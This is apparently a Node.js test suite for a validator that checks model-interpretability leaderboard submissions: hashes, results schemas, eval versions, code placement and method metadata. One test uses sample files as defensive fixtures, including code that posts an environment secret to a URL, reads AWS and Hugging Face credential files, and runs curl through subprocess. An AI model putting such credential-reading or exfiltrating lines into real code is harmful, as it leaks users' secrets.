// node --test submissions/check.test.mjs
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import {
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { checkMethod, checkSubmission, submissionDirs } from "./check.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const TEMPLATE = join(
  HERE,
  "..",
  "evals",
  "workspace-lenses",
  "submission",
  "submission.json",
);
const SHA = "a".repeat(64);
const URL_ = `https://huggingface.co/you/my-lens/blob/${"b".repeat(40)}/lens.pt`;

function template() {
  const s = JSON.parse(readFileSync(TEMPLATE, "utf8"));
  s.artifacts[0].sha256 = SHA;
  s.artifacts[0].url = URL_;
  return filled(s);
}

/** A template's author and contact, filled in as a person does at checkpoint 4. */
function filled(s) {
  return {
    ...s,
    authors: [{ name: "Ada Lovelace" }],
    contact: "ada@openaudit.com",
  };
}

function results(run = {}, model = "Qwen/Qwen3.6-27B") {
  return {
    schema: "openaudit.workspace-lenses.results/1",
    runs: {
      [model]: {
        tier: "full",
        partial: false,
        lens: { file: "lens.pt", sha256: SHA },
        harness: { openauditDirty: false },
        evals: {
          "workspace-lens-readout": {
            version: "2026-10.3",
            metrics: { recall_at_10: 0.5 },
          },
        },
        ...run,
      },
    },
  };
}

// A code file of a submission, and its test.
const CODE = "def fit_detector(model):\n    return None\n";
const CODE_SHA = createHash("sha256").update(CODE).digest("hex");
const CODE_TEST = "def test_fit():\n    assert True\n";
const README =
  "# X\n\n## Summary\n\nWe submit a new variant of a method. It reads the activations of the model and flags the replies that are lies. We fit it on one small model with the harness, and it did about as well as the usual probe.\n";

/** The folder of `s`: also writes each code file that it names (`path`), with a test. */
function write(s, r = results(), extra = {}) {
  const dir = join(
    mkdtempSync(join(tmpdir(), "sub-")),
    s.method ?? "x",
    s.variant ?? "x",
  );
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "submission.json"), JSON.stringify(s));
  if (r) writeFileSync(join(dir, "results.json"), JSON.stringify(r));
  const paths = [...(s.artifacts ?? []), s.recipe?.file]
    .map((f) => f?.path)
    .filter(
      (p) =>
        typeof p === "string" && p.startsWith("code/") && !p.includes(".."),
    );
  const code = {
    "README.md": README,
    ...Object.fromEntries(paths.map((p) => [p, CODE])),
  };
  if (paths.length) code["code/tests/test_code.py"] = CODE_TEST;
  for (const [name, text] of Object.entries({ ...code, ...extra })) {
    mkdirSync(dirname(join(dir, name)), { recursive: true });
    writeFileSync(join(dir, name), text);
  }
  return dir;
}

test("the template with real hashes passes", () => {
  const { errors, warnings } = checkSubmission(write(template()));
  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
});

test("no recipe is a warning, not an error", () => {
  const s = template();
  delete s.recipe;
  const { errors, warnings } = checkSubmission(write(s));
  assert.deepEqual(errors, []);
  assert.match(warnings[0], /recipe/);
});

test("the placeholder hashes, a method with no harness and a known variant fail", () => {
  const s = JSON.parse(readFileSync(TEMPLATE, "utf8"));
  const placeholder = checkSubmission(write(s)).errors;
  assert.ok(placeholder.some((e) => e.startsWith("artifacts[0].url")));
  assert.ok(placeholder.some((e) => e.startsWith("artifacts[0].sha256")));
  assert.ok(placeholder.some((e) => /^contact: a placeholder/.test(e)));
  assert.ok(placeholder.some((e) => /^authors\[0\]: a placeholder/.test(e)));
  const tbd = { ...template(), license: "TBD" };
  assert.ok(
    checkSubmission(write(tbd)).errors.includes(
      "license: a placeholder. Ask the person for it (checkpoint 4).",
    ),
  );
  const probes = { ...template(), method: "steering-vectors" };
  assert.ok(
    checkSubmission(write(probes)).errors.some((e) => /no harness/.test(e)),
  );
  const page = { ...template(), variant: "submit" };
  assert.ok(
    checkSubmission(write(page)).errors.some((e) => /name of a page/.test(e)),
  );
  const known = { ...template(), variant: "jpp-lens" };
  assert.ok(
    checkSubmission(write(known)).errors.some((e) =>
      /on the site already/.test(e),
    ),
  );
});

test("results must be a full run of the same lens file", () => {
  const errorsOf = (r) => checkSubmission(write(template(), r)).errors;
  assert.ok(errorsOf(null).some((e) => /results.json: required/.test(e)));
  assert.ok(
    errorsOf(results({ tier: "smoke" })).some((e) => /full run/.test(e)),
  );
  assert.ok(
    errorsOf(results({ partial: true })).some((e) => /full run/.test(e)),
  );
  assert.ok(
    errorsOf(results({ lens: { sha256: "c".repeat(64) } })).some((e) =>
      /sha256/.test(e),
    ),
  );
  assert.ok(
    errorsOf(results({ evals: {} })).some((e) =>
      /no workspace-lens-readout/.test(e),
    ),
  );
});

test("each eval of a run is a harness eval at its version, with metrics from 0 to 1", () => {
  const errorsOf = (evals) =>
    checkSubmission(write(template(), results({ evals }))).errors;
  const readout = (version, recall) => ({
    "workspace-lens-readout": { version, metrics: { recall_at_10: recall } },
  });
  assert.ok(
    errorsOf({ ...readout("2026-10.3", 0.5), other: { version: "1" } }).some(
      (e) => /other is not an eval/.test(e),
    ),
  );
  assert.ok(
    errorsOf(readout("2026-01", 0.5)).some((e) => /must be version/.test(e)),
  );
  assert.ok(
    errorsOf(readout("2026-10.3", 1.5)).some((e) => /from 0 to 1/.test(e)),
  );
});

test("an optional eval can be in a run, at its version", () => {
  const errorsOf = (version) =>
    checkSubmission(
      write(
        template(),
        results({
          evals: {
            "workspace-lens-readout": {
              version: "2026-10.3",
              metrics: { recall_at_10: 0.5 },
            },
            "workspace-probe-swap": { version, metrics: { swap_top1: 0.4 } },
          },
        }),
      ),
    ).errors;
  assert.deepEqual(errorsOf("2026-11"), []);
  assert.ok(errorsOf("2026-01").some((e) => /must be version/.test(e)));
});

test("weights in the folder fail", () => {
  const { errors } = checkSubmission(
    write(template(), results(), { "lens.pt": "x" }),
  );
  assert.ok(errors.some((e) => /Hugging Face/.test(e)));
});

test("a pickle file fails", () => {
  const s = template();
  s.artifacts[0].url = URL_.replace(/\.pt$/, ".pkl");
  const { errors } = checkSubmission(write(s, results()));
  assert.ok(errors.some((e) => /a pickle file can run code/.test(e)));
});

test("unknown params and recipe keys fail", () => {
  const s = template();
  s.artifacts[0].params.rank = 4;
  s.recipe.notes = "x";
  const { errors } = checkSubmission(write(s));
  assert.ok(errors.some((e) => e.startsWith("artifacts[0].params.rank")));
  assert.ok(errors.some((e) => e.startsWith("recipe.notes")));
});

test("a lens on another model passes, with a warning", () => {
  const s = template();
  s.artifacts[0].model = "meta-llama/Llama-3.1-8B";
  const { errors, warnings } = checkSubmission(
    write(s, results({}, "meta-llama/Llama-3.1-8B")),
  );
  assert.deepEqual(errors, []);
  assert.ok(warnings.some((w) => /leaderboard models/.test(w)));
  s.artifacts[0].model = "Llama-3.1-8B";
  assert.ok(
    checkSubmission(write(s)).errors.some((e) =>
      e.startsWith("artifacts[0].model"),
    ),
  );
});

test("a method with two harnesses picks the rules of the results schema", () => {
  const wsb = (model = "Qwen/Qwen3.6-27B", metrics = { macro_score: 0.4 }) => ({
    schema: "openaudit.workspacebench.results/1",
    runs: {
      [model]: {
        tier: "full",
        partial: false,
        lens: { file: "lens.pt", sha256: SHA, readout: "norm" },
        harness: { openauditDirty: false },
        evals: { workspacebench: { version: "2026-11", metrics } },
      },
    },
  });
  const errorsOf = (s, r) => checkSubmission(write(s, r)).errors;
  assert.deepEqual(errorsOf(template(), wsb()), []);
  assert.deepEqual(
    errorsOf(
      template(),
      wsb(undefined, { macro_score: 0.1, hinted_cutoff: -0.2 }),
    ),
    [],
  );
  assert.ok(
    errorsOf(template(), { ...wsb(), schema: "other/1" }).some((e) =>
      e.includes(
        'schema must be "openaudit.workspace-lenses.results/1" or "openaudit.workspacebench.results/1"',
      ),
    ),
  );
  const s = template();
  s.artifacts[0].model = "Qwen/Qwen3.5-9B";
  assert.ok(
    errorsOf(s, wsb("Qwen/Qwen3.5-9B")).some((e) =>
      /artifacts\[0\].model: one of Qwen\/Qwen3.6-27B$/.test(e),
    ),
  );
  assert.deepEqual(errorsOf(s, results({}, "Qwen/Qwen3.5-9B")), []);
  const both = wsb();
  both.runs["Qwen/Qwen3.6-27B"].evals["workspace-lens-readout"] = {
    version: "2026-10.3",
    metrics: { recall_at_10: 0.5 },
  };
  assert.ok(
    errorsOf(template(), both).some((e) =>
      /workspace-lens-readout is not an eval of this harness/.test(e),
    ),
  );
});

const VD = join(HERE, "..", "evals", "varied-deception", "submission");
const vdRules = JSON.parse(readFileSync(join(VD, "rules.json"), "utf8"));
const RECIPE_URL = `https://github.com/you/my-probe/blob/${"b".repeat(40)}/recipe.py`;

function vdTemplate() {
  const s = filled(
    JSON.parse(readFileSync(join(VD, "submission.json"), "utf8")),
  );
  s.recipe.file.sha256 = CODE_SHA;
  return s;
}

function vdFit(s, models = vdRules.coreModels, run = {}) {
  return {
    schema: vdRules.results,
    runs: Object.fromEntries(
      models.map((m) => [
        m,
        {
          tier: "full",
          partial: false,
          detector: { sha256: SHA },
          fit: { recipe: { sha256: CODE_SHA }, trainData: s.recipe.trainData },
          harness: {},
          evals: {
            "varied-deception": {
              version: "2026-06.1",
              metrics: { balanced_accuracy: 0.6 },
            },
          },
          ...run,
        },
      ]),
    ),
  };
}

test("the harness's core models are the site's core subjects", () => {
  const seed = JSON.parse(
    readFileSync(
      join(HERE, "..", "data", "seed", "evals", "varied-deception.json"),
      "utf8",
    ),
  );
  const setup = seed.versions.find(
    (v) => v.version === vdRules.evals["varied-deception"],
  ).methodSetup;
  assert.deepEqual(setup.coreSubjects, vdRules.coreModels);
});

test("a Varied Deception recipe with fits on the core models passes", () => {
  const s = vdTemplate();
  const { errors, warnings } = checkSubmission(write(s, vdFit(s)));
  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
});

test("a recipe with fits on some core models passes, with a warning", () => {
  const s = vdTemplate();
  const { errors, warnings } = checkSubmission(
    write(s, vdFit(s, ["Qwen/Qwen3.5-4B"])),
  );
  assert.deepEqual(errors, []);
  assert.ok(warnings.some((w) => /a fit on 1 of 9 core models/.test(w)));
});

test("each run must be a fit of the recipe file and its data", () => {
  const s = vdTemplate();
  const errorsOf = (r) => checkSubmission(write(s, r)).errors;
  assert.ok(
    errorsOf(vdFit(s, undefined, { fit: undefined })).some((e) =>
      /not a fit of recipe.file/.test(e),
    ),
  );
  assert.ok(
    errorsOf(
      vdFit(s, undefined, {
        fit: {
          recipe: { sha256: "c".repeat(64) },
          trainData: s.recipe.trainData,
        },
      }),
    ).some((e) => /not a fit of recipe.file/.test(e)),
  );
  const other = structuredClone(s.recipe.trainData);
  other.sources.train.file = "data/other.parquet";
  assert.ok(
    errorsOf(
      vdFit(s, undefined, {
        fit: { recipe: { sha256: CODE_SHA }, trainData: other },
      }),
    ).some((e) => /TRAIN_DATA is not recipe.trainData/.test(e)),
  );
  assert.ok(
    errorsOf(vdFit(s, ["meta-llama/Llama-3.1-8B"])).some((e) =>
      /Llama-3.1-8B: one of/.test(e),
    ),
  );
  assert.ok(
    errorsOf({ schema: vdRules.results, runs: {} }).some((e) =>
      /no run/.test(e),
    ),
  );
});

test("a recipe needs a pinned file and good train data", () => {
  const errorsOf = (s) => checkSubmission(write(s, vdFit(s))).errors;
  const placeholder = JSON.parse(
    readFileSync(join(VD, "submission.json"), "utf8"),
  );
  assert.ok(
    errorsOf(placeholder).some((e) => e.startsWith("recipe.file.sha256")),
  );
  const s = vdTemplate();
  s.recipe.trainData.kind = "generated";
  s.recipe.trainData.sources.train.revision = "main";
  const errors = errorsOf(s);
  assert.ok(errors.some((e) => e.startsWith("recipe.trainData.generator")));
  assert.ok(
    errors.some((e) => e.startsWith("recipe.trainData.sources.train.revision")),
  );
  s.recipe.trainData.sources.train.revision = "a".repeat(40);
  s.recipe.trainData.generator = `https://huggingface.co/datasets/you/rollouts/blob/${"b".repeat(40)}/README.md`;
  assert.ok(!errorsOf(s).some((e) => e.startsWith("recipe.trainData")));
  s.recipe.trainData = { kind: "none" };
  assert.ok(!errorsOf(s).some((e) => e.startsWith("recipe.trainData")));
  s.recipe.trainData.generator = "x";
  assert.ok(
    errorsOf(s).includes('recipe.trainData.generator: not with kind "none"'),
  );
  const none = vdTemplate();
  delete none.recipe.file;
  const r = checkSubmission(write(none, vdFit(none)));
  assert.ok(r.errors.some((e) => /or a recipe file/.test(e)));
  assert.ok(r.warnings.some((w) => w.startsWith("recipe.file: none")));
});

test("a harness with no fit has no recipe file", () => {
  const s = template();
  s.recipe.file = { url: RECIPE_URL, sha256: SHA };
  assert.ok(
    checkSubmission(write(s)).errors.some((e) =>
      e.startsWith("recipe.file: not a recipe key"),
    ),
  );
});

test("a recipe with a detector file: that model's run is a run of the file", () => {
  const s = vdTemplate();
  s.artifacts = [
    {
      model: "Qwen/Qwen3-4B",
      path: "code/qwen3_4b.py",
      sha256: CODE_SHA,
    },
  ];
  const r = vdFit(s);
  r.runs["Qwen/Qwen3-4B"] = {
    ...r.runs["Qwen/Qwen3.5-4B"],
    detector: { sha256: CODE_SHA },
    fit: undefined,
  };
  const { errors } = checkSubmission(write(s, r));
  assert.deepEqual(errors, []);
});

test("each harness template passes with real hashes and its own results", () => {
  for (const harness of ["sparse-autoencoders", "workspacebench"]) {
    const s = filled(
      JSON.parse(
        readFileSync(
          join(HERE, "..", "evals", harness, "submission", "submission.json"),
          "utf8",
        ),
      ),
    );
    const rules = JSON.parse(
      readFileSync(
        join(HERE, "..", "evals", harness, "submission", "rules.json"),
        "utf8",
      ),
    );
    const sha = s.artifacts[0].path ? CODE_SHA : SHA;
    s.artifacts[0].sha256 = sha;
    if (s.artifacts[0].url) {
      s.artifacts[0].url = s.artifacts[0].url.replace(/0{40}/, "b".repeat(40));
    }
    const slugs =
      rules.required?.[s.artifacts[0].model] ?? Object.keys(rules.evals);
    const evals = Object.fromEntries(
      slugs.map((e) => [
        e,
        { version: rules.evals[e], metrics: { score: 0.5 } },
      ]),
    );
    const r = {
      schema: rules.results,
      runs: {
        [s.artifacts[0].model]: {
          tier: "full",
          partial: false,
          [rules.artifact]: { sha256: sha },
          harness: {},
          evals,
        },
      },
    };
    const { errors, warnings } = checkSubmission(write(s, r));
    assert.deepEqual(errors, [], harness);
    assert.deepEqual(warnings, [], harness);
    s.artifacts[0].model = "meta-llama/Llama-3.1-8B";
    assert.ok(
      checkSubmission(write(s, r)).errors.some((e) =>
        e.startsWith("artifacts[0].model"),
      ),
      harness,
    );
  }
});

test("code in code/, with tests, passes; its sha256 must match", () => {
  const s = vdTemplate();
  const { errors, warnings } = checkSubmission(write(s, vdFit(s)));
  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
  s.recipe.file.sha256 = "e".repeat(64);
  assert.ok(
    checkSubmission(write(s, vdFit(s))).errors.some((e) =>
      e.startsWith(
        `recipe.file.sha256: code/recipe.py has the sha256 ${CODE_SHA}`,
      ),
    ),
  );
});

test("code by url, or a path out of code/, fails", () => {
  const s = vdTemplate();
  s.recipe.file = { url: RECIPE_URL, sha256: CODE_SHA };
  assert.ok(
    checkSubmission(write(s, vdFit(s))).errors.some((e) =>
      /code goes in the pull request/.test(e),
    ),
  );
  for (const path of ["recipe.py", "code/../submission.json"]) {
    s.recipe.file = { path, sha256: CODE_SHA };
    assert.ok(
      checkSubmission(write(s, vdFit(s))).errors.some((e) =>
        e.startsWith("recipe.file.path"),
      ),
      path,
    );
  }
});

test("code/: no weights, no packages, no pickle loads; tests are a warning", () => {
  const s = vdTemplate();
  const r = checkSubmission(
    write(s, vdFit(s), {
      "code/lens.pt": "x",
      "code/requirements.txt": "torch\n",
      "code/load.py": "import torch\nw = torch.load('w.pt')\n",
      "code/send.py":
        "import os, requests\nrequests.post('https://x', data=os.environ['K'])\n",
      "code/keys.py": "open(os.path.expanduser('~/.aws/credentials'))\n",
      "code/hf.py":
        "open(os.path.expanduser('~/.cache/huggingface/token')).read()\n",
      "code/hf2.py": "from huggingface_hub import get_token\nt = get_token()\n",
      "code/run.py":
        "import subprocess\nsubprocess.run(['curl', 'https://x'])\n",
    }),
  );
  assert.ok(
    r.warnings.some((w) => /code\/send.py: it reads environment/.test(w)),
  );
  assert.ok(
    r.errors.some((e) => /code\/keys.py: it reads a file with keys/.test(e)),
  );
  assert.ok(
    r.errors.some((e) => /code\/hf.py: it reads a file with keys/.test(e)),
  );
  assert.ok(
    r.errors.some((e) => /code\/hf2.py: it reads a file with keys/.test(e)),
  );
  assert.ok(
    r.warnings.some((w) => /code\/run.py: it starts other programs/.test(w)),
  );
  assert.ok(r.errors.some((e) => e.startsWith("code/lens.pt: not a code")));
  assert.ok(r.errors.some((e) => e.startsWith("code/requirements.txt")));
  assert.ok(r.errors.some((e) => /code\/load.py: torch.load/.test(e)));

  const dir = write(s, vdFit(s));
  rmSync(join(dir, "code", "tests"), { recursive: true });
  const w = checkSubmission(dir).warnings;
  assert.ok(w.some((x) => x.startsWith("code/tests/: no tests")));
});

test("the folder of submitted harnesses is not a method", () => {
  assert.ok(!submissionDirs().some((d) => d.includes("/harnesses/")));
});

/** A new method, from the LLM monitors entry, with its own param. */
function newMethod(slug = "debate-monitors") {
  const { method } = JSON.parse(
    readFileSync(
      join(HERE, "..", "data", "seed", "methods", "llm-monitors.json"),
      "utf8",
    ),
  );
  return {
    ...method,
    slug,
    displayName: "Debate Monitors",
    tagline: "Two models argue; a judge decides.",
    summary:
      "Two models debate if a reply is a lie, and a judge reads the debate.",
    expertSummary: "A debate between two models, read by a judge model.",
    safetyUse: "Finds lies that one monitor misses.",
    params: [
      ...method.params,
      { key: "rounds", label: "Rounds", type: "integer" },
    ],
  };
}

function newMethodDir(s, m = newMethod()) {
  return write(s, vdFit(s), { "../method.json": JSON.stringify(m) });
}

test("a new method with a variant on a harness passes", async () => {
  const s = {
    ...vdTemplate(),
    method: "debate-monitors",
    harness: "varied-deception",
  };
  s.artifacts = [];
  const dir = newMethodDir(s);
  assert.deepEqual(checkSubmission(dir).errors, []);
  assert.deepEqual((await checkMethod(dirname(dir))).errors, []);

  s.artifacts = [
    {
      model: "Qwen/Qwen3-4B",
      path: "code/qwen3_4b.py",
      sha256: CODE_SHA,
      params: { rounds: 3 },
    },
  ];
  const r = vdFit(s);
  r.runs["Qwen/Qwen3-4B"] = {
    ...r.runs["Qwen/Qwen3.5-4B"],
    detector: { sha256: CODE_SHA },
    fit: undefined,
  };
  const withParam = write(s, r, {
    "../method.json": JSON.stringify(newMethod()),
  });
  assert.deepEqual(checkSubmission(withParam).errors, []);
});

test("a new method needs a harness, a valid method.json and a new slug", async () => {
  const s = { ...vdTemplate(), method: "debate-monitors" };
  assert.ok(
    checkSubmission(newMethodDir(s)).errors.some((e) =>
      e.startsWith("harness: a new method"),
    ),
  );
  s.harness = "varied-deception";
  const bad = newMethod();
  delete bad.safetyUse;
  bad.slug = "other";
  const { errors } = await checkMethod(dirname(newMethodDir(s, bad)));
  assert.ok(errors.some((e) => /safetyUse/.test(e)));
  assert.ok(errors.some((e) => e.startsWith("method.json slug")));

  const taken = {
    ...vdTemplate(),
    method: "probes",
    harness: "varied-deception",
  };
  const dir = newMethodDir(taken, newMethod("probes"));
  assert.ok(!checkSubmission(dir).errors.some((e) => e.startsWith("harness:")));
  taken.harness = "sparse-autoencoders";
  const wrong = newMethodDir(taken, newMethod("probes"));
  assert.ok(
    checkSubmission(wrong).errors.some((e) =>
      e.startsWith("harness: probes runs on varied-deception"),
    ),
  );
  assert.ok(
    (await checkMethod(dirname(dir))).errors.some((e) =>
      /on the site already/.test(e),
    ),
  );

  const probes = JSON.parse(
    readFileSync(join(HERE, "..", "data/seed/methods/probes.json"), "utf8"),
  ).method;
  const copy = { ...newMethod(), expertSummary: probes.expertSummary };
  s.harness = "varied-deception";
  assert.ok(
    (await checkMethod(dirname(newMethodDir(s, copy)))).errors.some((e) =>
      e.startsWith("method.json expertSummary: the same text as probes"),
    ),
  );
});

test("a copy of an example, or its results with new hashes, is a warning", () => {
  const example = join(
    HERE,
    "examples",
    "methods",
    "probes",
    "example-tail-8-probe",
  );
  const dir = join(
    mkdtempSync(join(tmpdir(), "sub-")),
    "probes",
    "tail-8-copy",
  );
  cpSync(example, dir, { recursive: true });
  let { warnings } = checkSubmission(dir);
  assert.ok(warnings.some((w) => /a copy of .*example-tail-8-probe/.test(w)));

  const recipe = join(dir, "code", "recipe.py");
  const old = createHash("sha256").update(readFileSync(recipe)).digest("hex");
  writeFileSync(recipe, `${readFileSync(recipe, "utf8")}\n# changed\n`);
  const sha = createHash("sha256").update(readFileSync(recipe)).digest("hex");
  for (const f of ["submission.json", "results.json"]) {
    const p = join(dir, f);
    writeFileSync(p, readFileSync(p, "utf8").replaceAll(old, sha));
  }
  ({ warnings } = checkSubmission(dir));
  assert.ok(!warnings.some((w) => /a copy of/.test(w)));
  assert.ok(
    warnings.some((w) =>
      /results of .*example-tail-8-probe, with other sha256/.test(w),
    ),
  );
});
